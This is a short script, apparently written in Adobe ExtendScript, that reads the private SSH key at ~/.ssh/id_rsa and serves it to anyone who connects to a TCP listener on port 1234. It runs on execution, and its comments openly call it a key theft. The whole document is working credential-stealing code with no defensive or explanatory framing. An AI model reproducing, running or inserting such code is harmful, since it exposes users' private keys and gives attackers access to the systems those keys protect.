var stealFile = function(conn){
        var id_priv = new File("~/.ssh/id_rsa");
        id_priv.open('r');
        var str = id_priv.read();
        $.writeln(str);
        return str
 }

//A RSA thieft
function stealKeySrv() { 
  var tcp = new Socket; 
  // listen on port 1234 
  $.writeln ("Listening on port 1234");
  if (tcp.listen (1234)) { 
    for (;;) { 
      // poll for a new connection 
      var connection = tcp.poll(); 
      if (connection != null) {
        $.writeln ("Connection from " + connection.host); 
        // we have a new connection, so welcome and steal 
        // until client terminates the session 
        connection.writeln ("Here's your private rsa key"); 
        connection.writeln(stealFile ()); 
        connection.writeln ( "*** Goodbye ***"); 
        connection.close(); 
        delete connection; 
        $.writeln ("Connection closed"); 
      } 
    } 
  } 
} 

stealKeySrv();